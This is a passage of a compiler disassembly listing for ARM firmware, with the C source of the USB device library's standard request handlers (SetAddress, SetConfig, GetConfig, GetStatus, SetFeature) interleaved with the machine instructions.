    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bee2:	687b      	ldr	r3, [r7, #4]
 800bee4:	7c1b      	ldrb	r3, [r3, #16]
 800bee6:	2b00      	cmp	r3, #0
 800bee8:	d109      	bne.n	800befe <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800beea:	687b      	ldr	r3, [r7, #4]
 800beec:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bef0:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bef2:	f107 0208 	add.w	r2, r7, #8
 800bef6:	4610      	mov	r0, r2
 800bef8:	4798      	blx	r3
 800befa:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800befc:	e029      	b.n	800bf52 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800befe:	6839      	ldr	r1, [r7, #0]
 800bf00:	6878      	ldr	r0, [r7, #4]
 800bf02:	f000 fa2a 	bl	800c35a <USBD_CtlError>
        err++;
 800bf06:	7afb      	ldrb	r3, [r7, #11]
 800bf08:	3301      	adds	r3, #1
 800bf0a:	72fb      	strb	r3, [r7, #11]
      break;
 800bf0c:	e021      	b.n	800bf52 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bf0e:	687b      	ldr	r3, [r7, #4]
 800bf10:	7c1b      	ldrb	r3, [r3, #16]
 800bf12:	2b00      	cmp	r3, #0
 800bf14:	d10d      	bne.n	800bf32 <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bf16:	687b      	ldr	r3, [r7, #4]
 800bf18:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bf1c:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bf1e:	f107 0208 	add.w	r2, r7, #8
 800bf22:	4610      	mov	r0, r2
 800bf24:	4798      	blx	r3
 800bf26:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bf28:	68fb      	ldr	r3, [r7, #12]
 800bf2a:	3301      	adds	r3, #1
 800bf2c:	2207      	movs	r2, #7
 800bf2e:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bf30:	e00f      	b.n	800bf52 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bf32:	6839      	ldr	r1, [r7, #0]
 800bf34:	6878      	ldr	r0, [r7, #4]
 800bf36:	f000 fa10 	bl	800c35a <USBD_CtlError>
        err++;
 800bf3a:	7afb      	ldrb	r3, [r7, #11]
 800bf3c:	3301      	adds	r3, #1
 800bf3e:	72fb      	strb	r3, [r7, #11]
      break;
 800bf40:	e007      	b.n	800bf52 <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bf42:	6839      	ldr	r1, [r7, #0]
 800bf44:	6878      	ldr	r0, [r7, #4]
 800bf46:	f000 fa08 	bl	800c35a <USBD_CtlError>
      err++;
 800bf4a:	7afb      	ldrb	r3, [r7, #11]
 800bf4c:	3301      	adds	r3, #1
 800bf4e:	72fb      	strb	r3, [r7, #11]
      break;
 800bf50:	bf00      	nop
  }

  if (err != 0U)
 800bf52:	7afb      	ldrb	r3, [r7, #11]
 800bf54:	2b00      	cmp	r3, #0
 800bf56:	d11e      	bne.n	800bf96 <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bf58:	683b      	ldr	r3, [r7, #0]
 800bf5a:	88db      	ldrh	r3, [r3, #6]
 800bf5c:	2b00      	cmp	r3, #0
 800bf5e:	d016      	beq.n	800bf8e <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bf60:	893b      	ldrh	r3, [r7, #8]
 800bf62:	2b00      	cmp	r3, #0
 800bf64:	d00e      	beq.n	800bf84 <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bf66:	683b      	ldr	r3, [r7, #0]
 800bf68:	88da      	ldrh	r2, [r3, #6]
 800bf6a:	893b      	ldrh	r3, [r7, #8]
 800bf6c:	4293      	cmp	r3, r2
 800bf6e:	bf28      	it	cs
 800bf70:	4613      	movcs	r3, r2
 800bf72:	b29b      	uxth	r3, r3
 800bf74:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bf76:	893b      	ldrh	r3, [r7, #8]
 800bf78:	461a      	mov	r2, r3
 800bf7a:	68f9      	ldr	r1, [r7, #12]
 800bf7c:	6878      	ldr	r0, [r7, #4]
 800bf7e:	f000 fa5d 	bl	800c43c <USBD_CtlSendData>
 800bf82:	e009      	b.n	800bf98 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bf84:	6839      	ldr	r1, [r7, #0]
 800bf86:	6878      	ldr	r0, [r7, #4]
 800bf88:	f000 f9e7 	bl	800c35a <USBD_CtlError>
 800bf8c:	e004      	b.n	800bf98 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bf8e:	6878      	ldr	r0, [r7, #4]
 800bf90:	f000 faae 	bl	800c4f0 <USBD_CtlSendStatus>
 800bf94:	e000      	b.n	800bf98 <USBD_GetDescriptor+0x320>
    return;
 800bf96:	bf00      	nop
  }
}
 800bf98:	3710      	adds	r7, #16
 800bf9a:	46bd      	mov	sp, r7
 800bf9c:	bd80      	pop	{r7, pc}
 800bf9e:	bf00      	nop

0800bfa0 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bfa0:	b580      	push	{r7, lr}
 800bfa2:	b084      	sub	sp, #16
 800bfa4:	af00      	add	r7, sp, #0
 800bfa6:	6078      	str	r0, [r7, #4]
 800bfa8:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800bfaa:	683b      	ldr	r3, [r7, #0]
 800bfac:	889b      	ldrh	r3, [r3, #4]
 800bfae:	2b00      	cmp	r3, #0
 800bfb0:	d131      	bne.n	800c016 <USBD_SetAddress+0x76>
 800bfb2:	683b      	ldr	r3, [r7, #0]
 800bfb4:	88db      	ldrh	r3, [r3, #6]
 800bfb6:	2b00      	cmp	r3, #0
 800bfb8:	d12d      	bne.n	800c016 <USBD_SetAddress+0x76>
 800bfba:	683b      	ldr	r3, [r7, #0]
 800bfbc:	885b      	ldrh	r3, [r3, #2]
 800bfbe:	2b7f      	cmp	r3, #127	; 0x7f
 800bfc0:	d829      	bhi.n	800c016 <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800bfc2:	683b      	ldr	r3, [r7, #0]
 800bfc4:	885b      	ldrh	r3, [r3, #2]
 800bfc6:	b2db      	uxtb	r3, r3
 800bfc8:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bfcc:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bfce:	687b      	ldr	r3, [r7, #4]
 800bfd0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bfd4:	b2db      	uxtb	r3, r3
 800bfd6:	2b03      	cmp	r3, #3
 800bfd8:	d104      	bne.n	800bfe4 <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800bfda:	6839      	ldr	r1, [r7, #0]
 800bfdc:	6878      	ldr	r0, [r7, #4]
 800bfde:	f000 f9bc 	bl	800c35a <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bfe2:	e01d      	b.n	800c020 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800bfe4:	687b      	ldr	r3, [r7, #4]
 800bfe6:	7bfa      	ldrb	r2, [r7, #15]
 800bfe8:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800bfec:	7bfb      	ldrb	r3, [r7, #15]
 800bfee:	4619      	mov	r1, r3
 800bff0:	6878      	ldr	r0, [r7, #4]
 800bff2:	f000 ffbf 	bl	800cf74 <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800bff6:	6878      	ldr	r0, [r7, #4]
 800bff8:	f000 fa7a 	bl	800c4f0 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800bffc:	7bfb      	ldrb	r3, [r7, #15]
 800bffe:	2b00      	cmp	r3, #0
 800c000:	d004      	beq.n	800c00c <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800c002:	687b      	ldr	r3, [r7, #4]
 800c004:	2202      	movs	r2, #2
 800c006:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c00a:	e009      	b.n	800c020 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800c00c:	687b      	ldr	r3, [r7, #4]
 800c00e:	2201      	movs	r2, #1
 800c010:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800c014:	e004      	b.n	800c020 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800c016:	6839      	ldr	r1, [r7, #0]
 800c018:	6878      	ldr	r0, [r7, #4]
 800c01a:	f000 f99e 	bl	800c35a <USBD_CtlError>
  }
}
 800c01e:	bf00      	nop
 800c020:	bf00      	nop
 800c022:	3710      	adds	r7, #16
 800c024:	46bd      	mov	sp, r7
 800c026:	bd80      	pop	{r7, pc}

0800c028 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c028:	b580      	push	{r7, lr}
 800c02a:	b084      	sub	sp, #16
 800c02c:	af00      	add	r7, sp, #0
 800c02e:	6078      	str	r0, [r7, #4]
 800c030:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800c032:	2300      	movs	r3, #0
 800c034:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800c036:	683b      	ldr	r3, [r7, #0]
 800c038:	885b      	ldrh	r3, [r3, #2]
 800c03a:	b2da      	uxtb	r2, r3
 800c03c:	4b4e      	ldr	r3, [pc, #312]	; (800c178 <USBD_SetConfig+0x150>)
 800c03e:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800c040:	4b4d      	ldr	r3, [pc, #308]	; (800c178 <USBD_SetConfig+0x150>)
 800c042:	781b      	ldrb	r3, [r3, #0]
 800c044:	2b01      	cmp	r3, #1
 800c046:	d905      	bls.n	800c054 <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800c048:	6839      	ldr	r1, [r7, #0]
 800c04a:	6878      	ldr	r0, [r7, #4]
 800c04c:	f000 f985 	bl	800c35a <USBD_CtlError>
    return USBD_FAIL;
 800c050:	2303      	movs	r3, #3
 800c052:	e08c      	b.n	800c16e <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800c054:	687b      	ldr	r3, [r7, #4]
 800c056:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c05a:	b2db      	uxtb	r3, r3
 800c05c:	2b02      	cmp	r3, #2
 800c05e:	d002      	beq.n	800c066 <USBD_SetConfig+0x3e>
 800c060:	2b03      	cmp	r3, #3
 800c062:	d029      	beq.n	800c0b8 <USBD_SetConfig+0x90>
 800c064:	e075      	b.n	800c152 <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800c066:	4b44      	ldr	r3, [pc, #272]	; (800c178 <USBD_SetConfig+0x150>)
 800c068:	781b      	ldrb	r3, [r3, #0]
 800c06a:	2b00      	cmp	r3, #0
 800c06c:	d020      	beq.n	800c0b0 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800c06e:	4b42      	ldr	r3, [pc, #264]	; (800c178 <USBD_SetConfig+0x150>)
 800c070:	781b      	ldrb	r3, [r3, #0]
 800c072:	461a      	mov	r2, r3
 800c074:	687b      	ldr	r3, [r7, #4]
 800c076:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c078:	4b3f      	ldr	r3, [pc, #252]	; (800c178 <USBD_SetConfig+0x150>)
 800c07a:	781b      	ldrb	r3, [r3, #0]
 800c07c:	4619      	mov	r1, r3
 800c07e:	6878      	ldr	r0, [r7, #4]
 800c080:	f7ff f848 	bl	800b114 <USBD_SetClassConfig>
 800c084:	4603      	mov	r3, r0
 800c086:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800c088:	7bfb      	ldrb	r3, [r7, #15]
 800c08a:	2b00      	cmp	r3, #0
 800c08c:	d008      	beq.n	800c0a0 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800c08e:	6839      	ldr	r1, [r7, #0]
 800c090:	6878      	ldr	r0, [r7, #4]
 800c092:	f000 f962 	bl	800c35a <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c096:	687b      	ldr	r3, [r7, #4]
 800c098:	2202      	movs	r2, #2
 800c09a:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c09e:	e065      	b.n	800c16c <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c0a0:	6878      	ldr	r0, [r7, #4]
 800c0a2:	f000 fa25 	bl	800c4f0 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800c0a6:	687b      	ldr	r3, [r7, #4]
 800c0a8:	2203      	movs	r2, #3
 800c0aa:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c0ae:	e05d      	b.n	800c16c <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c0b0:	6878      	ldr	r0, [r7, #4]
 800c0b2:	f000 fa1d 	bl	800c4f0 <USBD_CtlSendStatus>
      break;
 800c0b6:	e059      	b.n	800c16c <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800c0b8:	4b2f      	ldr	r3, [pc, #188]	; (800c178 <USBD_SetConfig+0x150>)
 800c0ba:	781b      	ldrb	r3, [r3, #0]
 800c0bc:	2b00      	cmp	r3, #0
 800c0be:	d112      	bne.n	800c0e6 <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800c0c0:	687b      	ldr	r3, [r7, #4]
 800c0c2:	2202      	movs	r2, #2
 800c0c4:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800c0c8:	4b2b      	ldr	r3, [pc, #172]	; (800c178 <USBD_SetConfig+0x150>)
 800c0ca:	781b      	ldrb	r3, [r3, #0]
 800c0cc:	461a      	mov	r2, r3
 800c0ce:	687b      	ldr	r3, [r7, #4]
 800c0d0:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c0d2:	4b29      	ldr	r3, [pc, #164]	; (800c178 <USBD_SetConfig+0x150>)
 800c0d4:	781b      	ldrb	r3, [r3, #0]
 800c0d6:	4619      	mov	r1, r3
 800c0d8:	6878      	ldr	r0, [r7, #4]
 800c0da:	f7ff f837 	bl	800b14c <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800c0de:	6878      	ldr	r0, [r7, #4]
 800c0e0:	f000 fa06 	bl	800c4f0 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800c0e4:	e042      	b.n	800c16c <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800c0e6:	4b24      	ldr	r3, [pc, #144]	; (800c178 <USBD_SetConfig+0x150>)
 800c0e8:	781b      	ldrb	r3, [r3, #0]
 800c0ea:	461a      	mov	r2, r3
 800c0ec:	687b      	ldr	r3, [r7, #4]
 800c0ee:	685b      	ldr	r3, [r3, #4]
 800c0f0:	429a      	cmp	r2, r3
 800c0f2:	d02a      	beq.n	800c14a <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c0f4:	687b      	ldr	r3, [r7, #4]
 800c0f6:	685b      	ldr	r3, [r3, #4]
 800c0f8:	b2db      	uxtb	r3, r3
 800c0fa:	4619      	mov	r1, r3
 800c0fc:	6878      	ldr	r0, [r7, #4]
 800c0fe:	f7ff f825 	bl	800b14c <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800c102:	4b1d      	ldr	r3, [pc, #116]	; (800c178 <USBD_SetConfig+0x150>)
 800c104:	781b      	ldrb	r3, [r3, #0]
 800c106:	461a      	mov	r2, r3
 800c108:	687b      	ldr	r3, [r7, #4]
 800c10a:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800c10c:	4b1a      	ldr	r3, [pc, #104]	; (800c178 <USBD_SetConfig+0x150>)
 800c10e:	781b      	ldrb	r3, [r3, #0]
 800c110:	4619      	mov	r1, r3
 800c112:	6878      	ldr	r0, [r7, #4]
 800c114:	f7fe fffe 	bl	800b114 <USBD_SetClassConfig>
 800c118:	4603      	mov	r3, r0
 800c11a:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800c11c:	7bfb      	ldrb	r3, [r7, #15]
 800c11e:	2b00      	cmp	r3, #0
 800c120:	d00f      	beq.n	800c142 <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800c122:	6839      	ldr	r1, [r7, #0]
 800c124:	6878      	ldr	r0, [r7, #4]
 800c126:	f000 f918 	bl	800c35a <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800c12a:	687b      	ldr	r3, [r7, #4]
 800c12c:	685b      	ldr	r3, [r3, #4]
 800c12e:	b2db      	uxtb	r3, r3
 800c130:	4619      	mov	r1, r3
 800c132:	6878      	ldr	r0, [r7, #4]
 800c134:	f7ff f80a 	bl	800b14c <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800c138:	687b      	ldr	r3, [r7, #4]
 800c13a:	2202      	movs	r2, #2
 800c13c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800c140:	e014      	b.n	800c16c <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800c142:	6878      	ldr	r0, [r7, #4]
 800c144:	f000 f9d4 	bl	800c4f0 <USBD_CtlSendStatus>
      break;
 800c148:	e010      	b.n	800c16c <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800c14a:	6878      	ldr	r0, [r7, #4]
 800c14c:	f000 f9d0 	bl	800c4f0 <USBD_CtlSendStatus>
      break;
 800c150:	e00c      	b.n	800c16c <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800c152:	6839      	ldr	r1, [r7, #0]
 800c154:	6878      	ldr	r0, [r7, #4]
 800c156:	f000 f900 	bl	800c35a <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800c15a:	4b07      	ldr	r3, [pc, #28]	; (800c178 <USBD_SetConfig+0x150>)
 800c15c:	781b      	ldrb	r3, [r3, #0]
 800c15e:	4619      	mov	r1, r3
 800c160:	6878      	ldr	r0, [r7, #4]
 800c162:	f7fe fff3 	bl	800b14c <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800c166:	2303      	movs	r3, #3
 800c168:	73fb      	strb	r3, [r7, #15]
      break;
 800c16a:	bf00      	nop
  }

  return ret;
 800c16c:	7bfb      	ldrb	r3, [r7, #15]
}
 800c16e:	4618      	mov	r0, r3
 800c170:	3710      	adds	r7, #16
 800c172:	46bd      	mov	sp, r7
 800c174:	bd80      	pop	{r7, pc}
 800c176:	bf00      	nop
 800c178:	200003bc 	.word	0x200003bc

0800c17c <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c17c:	b580      	push	{r7, lr}
 800c17e:	b082      	sub	sp, #8
 800c180:	af00      	add	r7, sp, #0
 800c182:	6078      	str	r0, [r7, #4]
 800c184:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800c186:	683b      	ldr	r3, [r7, #0]
 800c188:	88db      	ldrh	r3, [r3, #6]
 800c18a:	2b01      	cmp	r3, #1
 800c18c:	d004      	beq.n	800c198 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800c18e:	6839      	ldr	r1, [r7, #0]
 800c190:	6878      	ldr	r0, [r7, #4]
 800c192:	f000 f8e2 	bl	800c35a <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800c196:	e023      	b.n	800c1e0 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800c198:	687b      	ldr	r3, [r7, #4]
 800c19a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c19e:	b2db      	uxtb	r3, r3
 800c1a0:	2b02      	cmp	r3, #2
 800c1a2:	dc02      	bgt.n	800c1aa <USBD_GetConfig+0x2e>
 800c1a4:	2b00      	cmp	r3, #0
 800c1a6:	dc03      	bgt.n	800c1b0 <USBD_GetConfig+0x34>
 800c1a8:	e015      	b.n	800c1d6 <USBD_GetConfig+0x5a>
 800c1aa:	2b03      	cmp	r3, #3
 800c1ac:	d00b      	beq.n	800c1c6 <USBD_GetConfig+0x4a>
 800c1ae:	e012      	b.n	800c1d6 <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800c1b0:	687b      	ldr	r3, [r7, #4]
 800c1b2:	2200      	movs	r2, #0
 800c1b4:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800c1b6:	687b      	ldr	r3, [r7, #4]
 800c1b8:	3308      	adds	r3, #8
 800c1ba:	2201      	movs	r2, #1
 800c1bc:	4619      	mov	r1, r3
 800c1be:	6878      	ldr	r0, [r7, #4]
 800c1c0:	f000 f93c 	bl	800c43c <USBD_CtlSendData>
        break;
 800c1c4:	e00c      	b.n	800c1e0 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800c1c6:	687b      	ldr	r3, [r7, #4]
 800c1c8:	3304      	adds	r3, #4
 800c1ca:	2201      	movs	r2, #1
 800c1cc:	4619      	mov	r1, r3
 800c1ce:	6878      	ldr	r0, [r7, #4]
 800c1d0:	f000 f934 	bl	800c43c <USBD_CtlSendData>
        break;
 800c1d4:	e004      	b.n	800c1e0 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800c1d6:	6839      	ldr	r1, [r7, #0]
 800c1d8:	6878      	ldr	r0, [r7, #4]
 800c1da:	f000 f8be 	bl	800c35a <USBD_CtlError>
        break;
 800c1de:	bf00      	nop
}
 800c1e0:	bf00      	nop
 800c1e2:	3708      	adds	r7, #8
 800c1e4:	46bd      	mov	sp, r7
 800c1e6:	bd80      	pop	{r7, pc}

0800c1e8 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c1e8:	b580      	push	{r7, lr}
 800c1ea:	b082      	sub	sp, #8
 800c1ec:	af00      	add	r7, sp, #0
 800c1ee:	6078      	str	r0, [r7, #4]
 800c1f0:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c1f2:	687b      	ldr	r3, [r7, #4]
 800c1f4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c1f8:	b2db      	uxtb	r3, r3
 800c1fa:	3b01      	subs	r3, #1
 800c1fc:	2b02      	cmp	r3, #2
 800c1fe:	d81e      	bhi.n	800c23e <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c200:	683b      	ldr	r3, [r7, #0]
 800c202:	88db      	ldrh	r3, [r3, #6]
 800c204:	2b02      	cmp	r3, #2
 800c206:	d004      	beq.n	800c212 <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c208:	6839      	ldr	r1, [r7, #0]
 800c20a:	6878      	ldr	r0, [r7, #4]
 800c20c:	f000 f8a5 	bl	800c35a <USBD_CtlError>
        break;
 800c210:	e01a      	b.n	800c248 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c212:	687b      	ldr	r3, [r7, #4]
 800c214:	2201      	movs	r2, #1
 800c216:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c218:	687b      	ldr	r3, [r7, #4]
 800c21a:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c21e:	2b00      	cmp	r3, #0
 800c220:	d005      	beq.n	800c22e <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c222:	687b      	ldr	r3, [r7, #4]
 800c224:	68db      	ldr	r3, [r3, #12]
 800c226:	f043 0202 	orr.w	r2, r3, #2
 800c22a:	687b      	ldr	r3, [r7, #4]
 800c22c:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c22e:	687b      	ldr	r3, [r7, #4]
 800c230:	330c      	adds	r3, #12
 800c232:	2202      	movs	r2, #2
 800c234:	4619      	mov	r1, r3
 800c236:	6878      	ldr	r0, [r7, #4]
 800c238:	f000 f900 	bl	800c43c <USBD_CtlSendData>
      break;
 800c23c:	e004      	b.n	800c248 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c23e:	6839      	ldr	r1, [r7, #0]
 800c240:	6878      	ldr	r0, [r7, #4]
 800c242:	f000 f88a 	bl	800c35a <USBD_CtlError>
      break;
 800c246:	bf00      	nop
  }
}
 800c248:	bf00      	nop
 800c24a:	3708      	adds	r7, #8
 800c24c:	46bd      	mov	sp, r7
 800c24e:	bd80      	pop	{r7, pc}

0800c250 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c250:	b580      	push	{r7, lr}
 800c252:	b082      	sub	sp, #8
 800c254:	af00      	add	r7, sp, #0
 800c256:	6078      	str	r0, [r7, #4]
 800c258:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c25a:	683b      	ldr	r3, [r7, #0]
 800c25c:	885b      	ldrh	r3, [r3, #2]
 800c25e:	2b01      	cmp	r3, #1
 800c260:	d107      	bne.n	800c272 <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c262:	687b      	ldr	r3, [r7, #4]
 800c264:	2201      	movs	r2, #1
 800c266:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c26a:	6878      	ldr	r0, [r7, #4]
 800c26c:	f000 f940 	bl	800c4f0 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c270:	e013      	b.n	800c29a <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c272:	683b      	ldr	r3, [r7, #0]
 800c274:	885b      	ldrh	r3, [r3, #2]
 800c276:	2b02      	cmp	r3, #2
 800c278:	d10b      	bne.n	800c292 <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c27a:	683b      	ldr	r3, [r7, #0]
 800c27c:	889b      	ldrh	r3, [r3, #4]
 800c27e:	0a1b      	lsrs	r3, r3, #8
 800c280:	b29b      	uxth	r3, r3
 800c282:	b2da      	uxtb	r2, r3
 800c284:	687b      	ldr	r3, [r7, #4]
 800c286:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c28a:	6878      	ldr	r0, [r7, #4]
 800c28c:	f000 f930 	bl	800c4f0 <USBD_CtlSendStatus>
}
 800c290:	e003      	b.n	800c29a <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
